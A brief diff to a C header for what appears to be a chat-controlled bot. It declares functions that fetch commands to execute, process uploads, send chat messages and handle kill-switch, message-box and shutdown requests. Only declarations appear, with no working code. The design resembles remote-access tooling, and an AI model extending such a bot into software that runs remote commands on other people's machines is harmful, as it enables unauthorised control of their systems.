@@ -42,7 +42,7 @@ typedef enum {
 } ShutDownRequest;
 
 typedef struct {
-    uint64_t killswitch;         // confirm code to activate
+    uint64_t killswitch;    // confirm code to activate
     int disabled;           // -1 = none, 0 = disabled, 1 = enabled
     MsgBoxRequest msgbox;
     ShutDownRequest shutdown;
@@ -53,6 +53,7 @@ typedef struct {
 void send_dc_msg(char* msg_text);
 void get_commands_to_exec(Command* out, int* out_count);
 void process_commands();
+void process_uploads();
 void delete_executed_messages(Command* cmds, int count);
 void init_bot();
 
